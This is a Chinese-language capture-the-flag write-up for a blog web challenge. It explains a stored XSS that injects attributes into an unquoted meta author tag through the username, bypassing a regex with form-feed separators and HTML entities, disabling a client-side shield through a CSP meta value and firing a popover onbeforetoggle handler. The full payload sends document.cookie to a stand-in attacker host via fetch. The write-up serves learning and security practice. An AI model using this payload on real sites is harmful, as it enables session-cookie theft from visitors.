## 题目分析

### 1. 环境差异 (vs Author)

与非 Plus 版本相比，本题的核心变化在于：

*   **服务端渲染 (SSR)**：文章内容直接由 PHP (`views/article.php`) 渲染在页面中，不再通过 `fetch` + `innerHTML` 动态加载。
*   **服务端净化**：引入了 `Sanitizer.php`，在保存文章时使用服务端的 DOMPurify 进行**两次**净化，极大地限制了文章内容的 XSS 向量。
*   **用户名强校验**：注册/修改用户名时增加了正则 `/[<>\'"\x20\t\r\n]/`，过滤了尖括号、引号、空格、制表符和换行符。
*   **客户端防护**：依然保留了 `xss-shield.js`，且由于是服务端渲染，如果不禁用该脚本，它仍可能通过 Hook 机制干扰攻击。

### 2. 漏洞点分析

**核心漏洞：Meta 标签属性注入 + 用户名校验绕过**

入口点依然是 `blog/views/layout/header.php`：

```php
<meta name="author" content=<?php echo $pageAuthor; ?>>
```

由于 `content` 属性值未加引号，存在注入属性的可能。

**限制突破：**

1. **分隔符绕过**：正则过滤了空格 (`\x20`) 等，但**未过滤换页符 (`\x0C`, Form Feed)等**。在 HTML 解析中，`\x0C` 被视为有效的分隔符，可以用来分隔属性。

2. **内容构造**：虽然无法直接使用引号和空格，但在属性值内部（如 CSP 策略字符串），我们可以使用 **HTML 实体编码**（如 `&#32;` 代替空格，`&#39;` 代替单引号）。浏览器在解析属性值时会解码这些实体。

   > 前者（Author）无法使用HTML 实体编码是因为`&`传入后会被`htmlspacialchar()`函数，但这里plus版本没用使用`htmlspacialchar()`函数

### 3. Popover XSS 技巧

由于服务端 DOMPurify 的存在，我们无法在文章内容中直接插入 `<script>` 或 `on*` 事件。此时可以利用[Exploiting XSS in hidden inputs and meta tags - PortSwigger](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)

*   将注入的 Meta 标签变成一个 **Popover 元素** (`popover` 属性)。
*   给它一个 ID (`id=test`)。
*   绑定 `onbeforetoggle` 事件。
*   在文章内容中放置一个合法的 HTML 元素（如 `<button>`），使用 `popovertarget="test"` 指向 Meta 标签。

## 攻击流程

### 步骤 1：注册恶意账号

我们需要构造一个用户名，使其在页面上渲染为带有恶意属性的 Meta 标签。

**构造逻辑：**

1.  **CSP 内容**: `script-src-elem 'none'` -> 转义为 `script-src-elem&#32;&#39;none&#39;`。这会阻止 `xss-shield.js` 加载，使客户端防护失效。
2.  **属性分隔**: 使用 `%0C` (URL 编码的 `\f`)。
3.  **XSS Payload**: `fetch` 发送 Cookie (使用反引号避免引号限制)。

**Username Payload (URL Encoded):**

```text
script-src-elem&#32;&#39;none&#39;%0Chttp-equiv=content-security-policy%0Cpopover%0Cid=test%0Conbeforetoggle=fetch(%60http://attacker-site.com/?c=$%7Bdocument.cookie%7D%60);
```

**解析后的 HTML (近似):**

```html
<meta name="author" content="script-src-elem 'none'" 
      http-equiv="content-security-policy" 
      popover 
      id="test" 
      onbeforetoggle="fetch(`http://attacker-site.com/?c=${document.cookie}`);">
```

### 步骤 2：发布恶意文章

文章内容需要包含触发器。服务端 DOMPurify 在默认配置下是允许 `button`标签和`popovertarget` 属性。

```html
<button id="audit" popovertarget="test">Click Me To Audit</button>
```

### 步骤 3：提交 Bot 访问

1.  攻击者注册上述恶意用户。
2.  攻击者发布上述文章。
3.  将文章 ID 提交给 Bot。
4.  Bot 访问文章页：
    *   **CSP 生效**：`script-src-elem 'none'` 阻止了 `xss-shield.js` 加载。
    *   **Bot 点击**：Bot 脚本检测到 `#audit` 按钮并点击。
    *   **事件触发**：点击触发 `popovertarget` -> 寻找 `id="test"` (Meta 标签) -> 触发 Meta 标签的 `onbeforetoggle` -> 执行 XSS 代码。
5.  在 Attacker Server 接收 Flag。

